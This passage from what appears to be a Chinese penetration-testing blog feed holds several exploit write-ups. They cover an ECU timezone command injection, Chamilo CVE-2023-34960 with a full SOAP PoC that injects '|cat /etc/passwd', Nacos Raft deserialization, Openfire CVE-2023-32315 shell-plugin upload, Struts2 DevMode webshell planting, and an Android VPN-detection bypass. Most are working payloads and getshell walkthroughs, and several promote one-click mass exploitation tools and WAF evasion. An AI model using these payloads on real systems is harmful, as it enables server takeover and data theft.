punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_mday'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_hour'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_min'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_sec'</span><span class="token punctuation">]</span>                           <span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/dev/rtc2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$local_time</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">//重启主函数和客户端函数</span>       <span class="token comment">//system("/home/application/ntpapp.exe");</span>       <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"killall main.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"killall client"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$results</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"value"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment">/* 将ECU本地页面变动数据存入数据库 */</span>       <span class="token comment">//ECU_id</span>       <span class="token variable">$ecuid</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"000000000000"</span><span class="token punctuation">;</span>       <span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/etc/yuneng/ecuid.conf"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>           <span class="token variable">$ecuid</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">//初始化消息体</span>       <span class="token variable">$record</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"APS1300000A104AAA0"</span><span class="token operator">.</span><span class="token variable">$ecuid</span><span class="token operator">.</span><span class="token variable">$local_time</span><span class="token operator">.</span><span class="token string double-quoted-string">"00000000000000"</span><span class="token operator">.</span><span class="token variable">$timezone</span><span class="token operator">.</span><span class="token string double-quoted-string">"END"</span><span class="token punctuation">;</span>       <span class="token comment">//计算消息长度并加上回车符号</span>       <span class="token variable">$record_length</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%05d"</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$record</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$record</span> <span class="token operator">=</span> <span class="token function">substr_replace</span><span class="token punctuation">(</span><span class="token variable">$record</span><span class="token punctuation">,</span> <span class="token variable">$record_length</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$record</span> <span class="token operator">=</span> <span class="token variable">$record</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>       <span class="token comment">//将消息保存到数据库</span>       <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"REPLACE INTO process_result (item, result, flag) VALUES(104, '<span class="token interpolation"><span class="token variable">$record</span></span>', 1)"</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pdo</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$results</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>从上面代码我们知道漏洞在如何构造回显exp linux的就你们了。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//设置linux系统时区</span>  <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cp /usr/share/zoneinfo/<span class="token interpolation"><span class="token variable">$timezone</span></span> /etc/localtime"</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="回显exp实战"><a href="#回显exp实战" class="headerlink" title="回显exp实战"></a>回显exp实战</h2><p>回显实战<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307141635244.png" alt="回显"></p><h2 id="武器化自动化getshell"><a href="#武器化自动化getshell" class="headerlink" title="武器化自动化getshell"></a>武器化自动化getshell</h2><p>老外写的是执行命令的我们直接上shell。这个getshell稍微有点坎坷。因为这个站点有waf🤣。所以我们的软件大部分漏洞基本都是实战后写的exp。所以对比同软件来说我们很有优势。后续将专注自动化对抗waf 批量一键getshell 对已经的漏洞能直接拿权限的直接拿权限。更新详情。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307141638708.png" alt="自动化getshell"></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>​Chamilo命令执行漏洞(CVE-2023-34960)复现</title>
      <link href="/penetrationtest/2023/07/articles/3a5c54b2df6ebaf1/"/>
      <url>/penetrationtest/2023/07/articles/3a5c54b2df6ebaf1/</url>
      
        <content type="html"><![CDATA[<h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>  Chamilo是一个开源的在线学习和内容管理系统，专注于易用性和可访问性。</p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Chamilo是一款可供用户免费下载的学习管理软件，其目的是提高来自弱势背景的用户对在线课程的可及性。Chamilo由一个名为Chamilo协会的非营利组织运行和管理。Chamilo存在命令执行漏洞，恶意攻击者可以通过构造的xml文件任意命令，进而控制服务器</p><h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>main<span class="token operator">/</span>webservices<span class="token operator">/</span>additional_webservices<span class="token operator">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> www<span class="token operator">.</span>xxx<span class="token operator">.</span>comUser<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">4.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> <span class="token constant">MSIE</span> <span class="token number">8.0</span><span class="token punctuation">;</span> Windows <span class="token constant">NT</span> <span class="token number">6.1</span><span class="token punctuation">)</span>Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>Connection<span class="token punctuation">:</span> Keep<span class="token operator">-</span>AliveContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">826</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token operator">&lt;</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>Envelope xmlns<span class="token punctuation">:</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token operator">=</span><span class="token string double-quoted-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns<span class="token punctuation">:</span>ns1<span class="token operator">=</span><span class="token string double-quoted-string">"&#123;http://ip:port&#125;"</span> xmlns<span class="token punctuation">:</span>xsi<span class="token operator">=</span><span class="token string double-quoted-string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns<span class="token punctuation">:</span>xsd<span class="token operator">=</span><span class="token string double-quoted-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns<span class="token punctuation">:</span>ns2<span class="token operator">=</span><span class="token string double-quoted-string">"http://xml.apache.org/xml-soap"</span> xmlns<span class="token punctuation">:</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENC</span><span class="token operator">=</span><span class="token string double-quoted-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> <span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>encodingStyle<span class="token operator">=</span><span class="token string double-quoted-string">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>Body<span class="token operator">></span><span class="token operator">&lt;</span>ns1<span class="token punctuation">:</span>wsConvertPpt<span class="token operator">></span><span class="token operator">&lt;</span>param0 xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"ns2:Map"</span><span class="token operator">></span><span class="token operator">&lt;</span>item<span class="token operator">></span><span class="token operator">&lt;</span>key xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"xsd:string"</span><span class="token operator">></span>file_data<span class="token operator">&lt;</span><span class="token operator">/</span>key<span class="token operator">></span><span class="token operator">&lt;</span>value xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"xsd:string"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>value<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>item<span class="token operator">></span><span class="token operator">&lt;</span>item<span class="token operator">></span><span class="token operator">&lt;</span>key xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"xsd:string"</span><span class="token operator">></span>file_name<span class="token operator">&lt;</span><span class="token operator">/</span>key<span class="token operator">></span><span class="token operator">&lt;</span>value xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"xsd:string"</span><span class="token operator">></span><span class="token string backtick-quoted-string">`&#123;&#125;`</span><span class="token operator">.</span>pptx'<span class="token operator">|</span><span class="token string double-quoted-string">" |cat /etc/passwd||a #&lt;/value>&lt;/item>&lt;item>&lt;key xsi:type="</span>xsd<span class="token punctuation">:</span><span class="token keyword type-declaration">string</span><span class="token string double-quoted-string">">service_ppt2lp_size&lt;/key>&lt;value xsi:type="</span>xsd<span class="token punctuation">:</span><span class="token keyword type-declaration">string</span>"<span class="token operator">></span><span class="token number">720</span>x540<span class="token operator">&lt;</span><span class="token operator">/</span>value<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>item<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>param0<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ns1<span class="token punctuation">:</span>wsConvertPpt<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>Body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>Envelope<span class="token operator">></span></code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据上面exp我们分析一下这个漏洞形成的原因。下面代码 初始化了一个类SoapServer  并且输入了。构造函数传入了uri 和文件的位置。添加一个函数wsConvertPpt 并且使用handle函数进行处理。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071034484.png" alt="漏洞代码"><br>我们看到有exec函数 。这里可能是漏洞触发点我们用网站调试一下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071039787.png" alt="漏洞函数"><br>我们使用phpinfo()函数发现没有反应有人就说是是不是不是这个函数。我也想但是如果我把这个函数名称改了以后会报错<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071042635.png" alt="测试函数"><br>修改函数名称报错。因此确定这个就是漏洞函数点。那为什么没有东西输出呢。可能是进行了调用了php内置函数清除输出了。那么我们怎么进行测试呢。我们看到有这一句代码 return serialize($data); 那么我们测试一下使用return 来返回数据代替echo  等输出命令<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071045972.png" alt="报错"><br>明白如何接收数据了我们就可以构造exp了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071050691.png" alt="接收数据"><br>构造exp关键点 </p><pre class="language-sh" data-language="sh"><code class="language-sh">cd &#x2F;home&#x2F;yachimec&#x2F;public_html&#x2F;learn&#x2F;main&#x2F;inc&#x2F;lib&#x2F;ppt2png &amp;&amp; java  -Dfile.encoding&#x3D;UTF-8 -cp .:jodconverter-2.2.2.jar:jodconverter-cli-2.2.2.jar DokeosConverter -p 2002 -w 720 -h 540 -d oogie &quot;&#x2F;home&#x2F;yachimec&#x2F;public_html&#x2F;learn&#x2F;archive&#x2F;wsConvert&#x2F;&#96;&#123;&#125;&#96;&#x2F;&#96;&#123;&#125;&#96;.pptx&#39;|&quot; |whoami||a #&quot;  &quot;&#x2F;home&#x2F;yachimec&#x2F;public_html&#x2F;learn&#x2F;archive&#x2F;wsConvert&#x2F;&#96;&#123;&#125;&#96;-n&#x2F;&#96;&#123;&#125;&#96;.html&quot; 只要这句可以执行那么exp就构造完毕了</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071052947.png" alt="构造exp"></p><h2 id="构造exp拿下webshell"><a href="#构造exp拿下webshell" class="headerlink" title="构造exp拿下webshell"></a>构造exp拿下webshell</h2><p>我们自己构造exp 使用echo和管道符和其他linux命令执行拿下websell。改功能已经集成到工具里面了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071054586.png" alt="拿下webshell"><br>工具一键getshell执行结果。自动化getshell。另外我们看到最后是删除临时目录啥的这个可以使用条件竞争一直写文件。估计可以写shell直接。但是不如rce到位。地址:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071056216.png" alt="工具执行"></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nacos集群Raft反序列化漏洞(QVD-2023-13065)-复现</title>
      <link href="/penetrationtest/2023/07/articles/4c6ad3c1efab8e8e/"/>
      <url>/penetrationtest/2023/07/articles/4c6ad3c1efab8e8e/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><ul><li>在Nacos集群处理部分Jraft请求时，攻击者可以无限制使用hessian进行反序列化利用，最终实现代码执行。Jraft通信端口默认7848。其中受影响版本<br/>1.4.0 <= Nacos < 1.4.6 <br/>2.0.0 <= Nacos < 2.2.3 <br/>这个漏洞的特点是不是直接使用http协议触发的漏洞。是用tcp Jraft 通信。神奇在于通过这个jraft 发送序列化的代码。直接注入web的内存马。这个漏洞比较新奇所以来复现一下</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li>有漏洞的界面如下图:<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061705157.png" alt="界面"></p><p>存在Jraft 并且特征如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061708448.png" alt="漏洞特征"></p></li></ul><h2 id="工具复现"><a href="#工具复现" class="headerlink" title="工具复现"></a>工具复现</h2><ul><li>exp:https://github.com/c0olw/NacosRce/ 这个release 带着很多jar包。所以我们自己编译一个下载地址 见频道</li><li>结果如下:<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061717273.png" alt="实战结果"></li><br>brup成功特征。这个工具你如果执行cmd命令。那么自动给你注入cmd内存马我们在brup上执行一下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307070955954.png" alt="brup复现执行结果"></p></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-32315-openfire权限绕过rce</title>
      <link href="/penetrationtest/2023/06/articles/4d9b7730efb1222b/"/>
      <url>/penetrationtest/2023/06/articles/4d9b7730efb1222b/</url>
      
        <content type="html"><![CDATA[<h2 id="复现遇到的问题"><a href="#复现遇到的问题" class="headerlink" title="复现遇到的问题"></a>复现遇到的问题</h2><p>利用exp添加用户以后然后上传shell在下显示出插件名称。exp个人推荐：<br><a href="https://github.com/miko550/CVE-2023-32315">https://github.com/miko550/CVE-2023-32315</a><br>登陆以后来到来到插件这里<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211001134.png" alt="来到插件这里"><br>往下拉看到<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211003080.png" alt="上传点"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306210955127.png" alt="复现遇到的问题"><br>访问出现404页面<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306210958209.png" alt="访问出现"></p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>既然那么部署不行我们换一个部署利用其它的插件进行。我测试了这个页面其它插件也不行官方的。那么只有一个问题就是插件格式不对这个不能解析所以换成可以解析的插件部署复现。那我们可以下载他来的插件源码进行编译然后。直接访问就行了。这里我们用db-access插件来复现。<br>添加shell编译然后上传。上传后来这里查看点击<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211005566.png" alt="上传插件"><br>然后访问我们的shell。直接拿捏。<font color="red" size="4">由于这个漏洞特殊性和net的原因无法编写exp。后续群主不忙了专注研究软件的时候。会增加第三方库调用支持扩大软件使用功能。直接调用python或者go等漏洞利用程序。使我们的工具更加强大。工具和工具源代码还没有发布。请关注频道和github信息感谢大家支持。</font><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211008507.png" alt="拿下shell"></p><h2 id="遇到的工具编译后的插件下载"><a href="#遇到的工具编译后的插件下载" class="headerlink" title="遇到的工具编译后的插件下载"></a>遇到的工具编译后的插件下载</h2><p><a href="https://t.me/SoftwareUpdateChannel/211">https://t.me/SoftwareUpdateChannel/211</a></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2-DevMode漏洞渗透实战</title>
      <link href="/penetrationtest/2023/06/articles/3cce7d6763611bcc/"/>
      <url>/penetrationtest/2023/06/articles/3cce7d6763611bcc/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ul><li>看博客看了这么长时间的兄弟估计有点疑惑这人。老发安卓到底是会不会渗透测试。我是在学习安卓逆向所以找点案例练练手。所以我发的安卓逆向的比较多。后续准备学习内网渗透测试。我是想自己可以掌握 包含 渗透测试 ,代码审计,安卓逆向,内网渗透,免杀这些所有的能力。为以后为了我们的工具和内部群和大家一起交流。所以我在不断努力中。</li><li>这篇文章带大家来看看渗透实战测试。这个遇到的实战比较少。之前有朋友在项目中也遇到没怎么搞。因为学习比较忙。前段时间闲来无事帮忙搞了一个渗透测试项目。又碰到这个漏洞了。这个漏洞碰到的比较少所以很少人可以搞定。吐司貌似也有一篇文章说的是这个漏洞如何利用。开始正题吧</li></ul><h2 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h2><ul><li>使用ABC_123 大佬的struts2 工具扫描出Struts2-DevMode见下图。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021416291.png" alt="发现目标"></p><li>因为是工具扫描出来的漏洞不确定他是否存在漏洞所以我们。要手工对这个网站进行测试。确定是否存在漏洞。另外确定网站是否存在waf等所以我们构造payload进行手工测试见下图:我们请求构造一个不存在的url然后报错了。说明开启了debug模式</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021421494.png" alt="开启了debug模式"></p></ul><h2 id="确定是否存在漏洞"><a href="#确定是否存在漏洞" class="headerlink" title="确定是否存在漏洞"></a>确定是否存在漏洞</h2><ul><li>我们使用payload打一下,回显了freemarker。所以我们确定这个100%是存在漏洞了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021500117.png" alt="存在漏洞"></p></ul><h2 id="确定是否存在waf"><a href="#确定是否存在waf" class="headerlink" title="确定是否存在waf"></a>确定是否存在waf</h2><ul><li>祭出宽字节 struts-061的payload 打一下,确定不存在waf。但是没有打成功。尝试了许多exp。都返回null. 他们的exp都是在body里面返回结果。那么是不是body里面返回的不行呢。我们在header里面返回结果行不行(这个思路比较重要如果没有这个这个网站拿不下)</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021428973.png" alt="不存在waf"></p></ul><h2 id="改变exp思路成功执行命令"><a href="#改变exp思路成功执行命令" class="headerlink" title="改变exp思路成功执行命令"></a>改变exp思路成功执行命令</h2><ul><li>那我们找一个header返回的exp打一下。由于之前写我们的webframeworktools 工具的时候我们对struts2 工具的exp进行深入研究。所以直接找到可以在header里面执行payload的工具转换成执行命令的成功执行命令。由于这个比较隐秘exp我就打码处理了。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021458161.png" alt="成功执行命令"></p></li></ul><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><ul><li>看到可以只命令估计大部分的思路是反弹shell。然后就行了。但是我测试大部分反弹shell的东东反弹shell都不行。我用curl 测试可以出网。现有阶段我们不能反弹。只能看看能不能拿下webshell。有tomcat说可以解析jsp。那我们能不能利用wget下载然后getshell通过找网站特征图片.css，js，html。等后续最终确定了web路径。然后wget下载拿到shell了。后来想了一下我们能不能直接上传webshell呢。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021443322.png" alt="拿到webshell"></p></ul><h2 id="构造exp上传webshell"><a href="#构造exp上传webshell" class="headerlink" title="构造exp上传webshell"></a>构造exp上传webshell</h2><ul><li>根据工具的exp构造包上传webshell。此exp已经集成到工具里面了详情看更新https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021448694.png" alt="通过上传拿到webshell"></p></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>之所以能成功getshell就是我们打破常规思路。在header头部显示结果。成功了。后续内网渗透什么的。等我研究了后续有我自己实战渗透内网的东东或者是靶场什么的只要我觉得这个不错我会写文章。共享的。不管是渗透话是什么我们一定不能按照常规思路进行测试。因为常规测试的路子已经被别人知道了堵死了。至于如何练习自己的渗透思维。多练习。加自己的总结。</li></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某appvpn代理检测绕过算法定位</title>
      <link href="/androidreverse/2023/06/articles/9d4835eb0ff8f92b/"/>
      <url>/androidreverse/2023/06/articles/9d4835eb0ff8f92b/</url>
      
        <content type="html"><![CDATA[<h2 id="安卓获取VPN代码"><a href="#安卓获取VPN代码" class="headerlink" title="安卓获取VPN代码"></a>安卓获取VPN代码</h2><ul></li>安卓vpn检测代码:</li><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">></span></span> networkInterfaces <span class="token operator">=</span> <span class="token class-name">NetworkInterface</span><span class="token punctuation">.</span><span class="token function">getNetworkInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>networkInterfaces<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">NetworkInterface</span> next <span class="token operator">=</span> networkInterfaces<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getName获得网络设备名称="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getDisplayName获得网络设备显示名称="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getDisplayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getIndex获得网络接口的索引="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"isUp是否已经开启并运行="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">isUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"isBoopback是否为回调接口="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">isLoopback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"**********************"</span> <span class="token operator">+</span> count<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SocketException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><li>上面代码就是获取vpn 名称什么各种信息的代码.有了上诉代码我就来编写frida hook vpn检测的hook脚本</li></ul><h2 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h2><ul><li>我们打开小黄鸟抓包工具。然后打开软件。可以看到检测vpn。因为小黄鸟这个就是基于 vpn的抓包工具。那么如果绕过呢。(1)我们就需要定位这个检测是在哪个函数。然后hook检测函数绕过。(2)另外我们也说了我们知道安卓如何获取vpn名称的代码我们可以hook检测到的名称修改成其他名字这不就绕过了.两步都能绕过。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020943617.png" alt="检测vpn"></p></ul><h2 id="定位思路"><a href="#定位思路" class="headerlink" title="定位思路"></a>定位思路</h2><ul><li>hook这个温馨提示 这个弹出的框定位检测函数</li><li>hook vpn检测函数 修改获取到的vpn名称</li><li>hook vpn检测函数 修改调用检测vpn函数的返回值</li><li>第一个我们不知道如何进行hook。我们只知道安卓是如何获取vpn的那么我们编写hook脚本进行定位。直接定位到。hook脚本发布到频道。请到频道下载。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020954590.png" 